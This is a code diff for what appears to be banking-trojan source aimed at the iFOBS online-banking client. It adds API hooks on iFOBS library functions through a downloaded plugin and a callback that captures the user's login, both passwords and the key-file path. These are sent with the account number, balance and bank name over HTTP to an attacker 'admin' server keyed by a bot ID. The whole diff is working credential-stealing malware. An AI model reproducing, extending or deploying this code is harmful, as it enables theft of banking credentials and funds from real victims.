@@ -44,16 +44,42 @@ struct AccBalans
 	char acc[64];
 	char balans[64];
 	char nameBank[128];
+	char login[64];
+	char pwd1[64];
+	char pwd2[64];
+	char pathKeys[MAX_PATH];
+	int set;
 };
 
-int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
+//объявления и определения необходимые для ifobs.plug
+struct HookFunc //функция на которую ставится хук
+{
+	char* nameDll; //имя длл в которой находится nameHookFunc
+	char* nameFunc; //имя функции на которую подменяем
+	DWORD hashOrigFunc; //хеш подменяемой функции
+	char* nameOrigFunc; //имя подменяемой функции (для ifobs.plug)
+};
+
+static HookFunc funcsPlug[] =
+{
+	{ "VistaDB_D7.bpl", "HProc2", 0xA9782FE7, "OpenDatabaseConnection" },
+	{ "RtlData1.bpl", "HProc3", 0x1678D314, "TaskAfterSynchRun" },
+	{ "vcl70.bpl", "HProc4", 0x8D55F8B4, "TCustomFormShow" },
+	{ "vcl70.bpl", "HProc5", 0x3DF02899, "TCustomFormCloseQuery" },
+	{ "RtlStore.bpl", "HProc6", 0xCF6CD66, "GlobalAppStorage" },
+	{ 0 }
+};
+
 //прототип из ifobs.plug
 typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
+
+
 char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер
 char resultGrab[512]; //результат грабера для отсылки в админку и видео сервер
 
 //хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
 DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
+AccBalans dataFromPlug; //данные от ifobs.plug
 
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
@@ -227,26 +253,27 @@ static char* GetAdminUrl( char* url )
 static DWORD WINAPI SendBalans( LPVOID p )
 {
 	char urlAdmin[128];
-	AccBalans* ab = (AccBalans*)p;
 	VideoLog log( "ifobs" );
-	log.Send( 10, "Счет: '%s', баланс: '%s', банк: '%s'", ab->acc, ab->balans, ab->nameBank );
+	TMemory text(512);
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+	pwsprintfA( text.AsStr(), "Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys );
+	log.Send( 0, "Счет: '%s', баланс: '%s', банк: '%s'", dataFromPlug.acc, dataFromPlug.balans, dataFromPlug.nameBank );
+	log.Send2( 0, text.AsStr() );
 	if( GetAdminUrl(urlAdmin) )
 	{
-		fwsprintfA pwsprintfA = Get_wsprintfA();
 		TMemory request(1024);
 		string azUser = GetAzUser();
-		char* urlBank = "nothing"; //URLEncode(ab->nameBank);
-		char* urlGrab = URLEncode(resultGrab);
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
-//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=1", urlAdmin, BOT_UID, azUser.t_str(), ab->balans );
+		char* urlBank = URLEncode(dataFromPlug.nameBank);
+		char* urlText = URLEncode(text);
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.acc, urlBank, urlText );
 		STR::Free(urlBank);
-		STR::Free(urlGrab);
-//		THTTP H;
-//		H.Get(request.AsStr());
-		THTTPResponseRec Response;
-		ClearStruct(Response);
-		HTTP::Get( request.AsStr(), 0, &Response );
-		HTTPResponse::Clear(&Response);
+		STR::Free(urlText);
+		THTTP H;
+		H.Get(request.AsStr());
+//		THTTPResponseRec Response;
+//		ClearStruct(Response);
+//		HTTP::Get( request.AsStr(), 0, &Response );
+//		HTTPResponse::Clear(&Response);
 		DBG( "IFobs", "Отослали запрос: '%s'", request.AsStr() );
 	}
 	MemFree(p);
@@ -257,11 +284,25 @@ void WINAPI PutBalans( const char* acc, const char* balans, const char* nameBank
 {
 	DBG( "IFobs", "acc: '%s', balans: '%s', name bank: '%s'", acc, balans, nameBank );
 	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
-	m_lstrcpy( ab->acc, acc );
-	trimall( ab->acc, ' ' );
-	m_lstrcpy( ab->balans, balans );
-	m_lstrcpy( ab->nameBank, nameBank );
-	RunThread( SendBalans, ab );
+	m_lstrcpy( dataFromPlug.acc, acc );
+	trimall( dataFromPlug.acc, ' ' );
+	m_lstrcpy( dataFromPlug.balans, balans );
+	m_lstrcpy( dataFromPlug.nameBank, nameBank );
+	dataFromPlug.set |= 1;
+	if( dataFromPlug.set == 3 ) //все поля заполнены
+		RunThread( SendBalans, 0 );
+}
+
+void WINAPI PutPasswords(const char* login, const char* pwd1, const char* pwd2, const char* pathKeys )
+{
+	DBG( "IFobs", "login: '%s', psw1: '%s', psw2: '%s'", login, pwd1, pwd2 );
+	SafeCopyStr( dataFromPlug.login, sizeof(dataFromPlug.login), login );
+	SafeCopyStr( dataFromPlug.pwd1, sizeof(dataFromPlug.pwd1), pwd1 );
+	SafeCopyStr( dataFromPlug.pwd2, sizeof(dataFromPlug.pwd2), pwd2 );
+	SafeCopyStr( dataFromPlug.pathKeys, sizeof(dataFromPlug.pathKeys), pathKeys );
+	dataFromPlug.set |= 2;
+	if( dataFromPlug.set == 3 ) //все поля заполнены
+		RunThread( SendBalans, 0 );
 }
 
 DWORD WINAPI PluginIFobs(LPVOID)
@@ -269,34 +310,60 @@ DWORD WINAPI PluginIFobs(LPVOID)
 	VideoLog log( "ifobs" );
 	log.Send2( 0, "Загрузка плагина ifobs.plug" );
 	TPlugin ifobsPlug("ifobs.plug");
+	dataFromPlug.set = 0;
 	if( ifobsPlug.Download(true) )
 	{
-		log.Send2( 1, "Плагин загружен" );
+		log.Send2( 0, "Плагин загружен" );
 		ifobsPlug.SetNotFree();
 		DBG( "IFobs", "Загрузили ifobs.plug" );
+
 		PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
 		if( InitFunc )
 		{
-			log.Send2( 2, "найдена InitFunc()" );
+			log.Send2( 0, "найдена InitFunc()" );
 			DBG( "IFobs", "есть InitFunc" );
-			DWORD HProc1 = (DWORD)ifobsPlug.GetProcAddress("HProc1");
-			if( HProc1 )
+
+			if ( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
+				DBG( "IFobs", "BalanceCallBack set ok.");
+
+			if ( InitFunc((DWORD)&PutPasswords, "PasswordsCallBack") )
+				DBG( "IFobs", "PasswordsCallBack set ok.");
+
+			HookFunc* fp = funcsPlug;
+			bool ok = true;
+			while( fp->nameDll )
 			{
-				log.Send2( 3, "найдена HProc1()" );
-				DBG( "IFobs", "есть HProc1" );
-				//хукаем функцию @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString
-				if( HookApi( "VistaDB_D7.bpl", 0x238E92A4, (PVOID)HProc1, (PVOID*)&pTVDBDirectGetCurrency ) )
+				void* plugFunc = (void*)ifobsPlug.GetProcAddress(fp->nameFunc);
+				if( plugFunc )
 				{
-					log.Send2( 4, "Установли хук" );
-					DBG( "IFobs", "Установлен хук на @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString" );
-					if( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
+					log.Send( 0, "Найдена функция %s", fp->nameFunc );
+					DBG( "IFobs", "Найдена функция %s", fp->nameFunc );
+					DWORD addrRealFunc;
+					if( HookApi( fp->nameDll, fp->hashOrigFunc, plugFunc, (PVOID*)&addrRealFunc ) )
 					{
-						log.Send2( 5, "Установлена BalanceCallBack" );
-						DBG( "IFobs", "BalanceCallBack set ok.");
+						log.Send( 0, "Установлен хук на %s", fp->nameOrigFunc );
+						DBG( "IFobs", "Установлен хук на %s", fp->nameOrigFunc );
+						if( InitFunc(addrRealFunc, fp->nameOrigFunc) )
+						{
+							log.Send( 0, "InitFunc на %s", fp->nameOrigFunc );
+							DBG( "IFobs", "InitFunc на %s", fp->nameOrigFunc );
+							fp++;
+							continue;
+						}
 					}
-					if( InitFunc((DWORD)pTVDBDirectGetCurrency, "GetCurrency") )
-						DBG( "IFobs", "хук установлен успешно, %08x %08x", pTVDBDirectGetCurrency, HProc1 );
 				}
+				ok = false;
+				break;
+			}
+			if( ok )
+			{
+				log.Send2( 0, "ifobs.plug успешно установлена" );
+				DBG( "IFobs", "ifobs.plug успешно установлена" );
+			}
+			else
+			{
+				log.Send2( 0, "ifobs.plug не установлена" );
+				DBG( "IFobs", "ifobs.plug не установлена" );
 			}
 		}
 	}
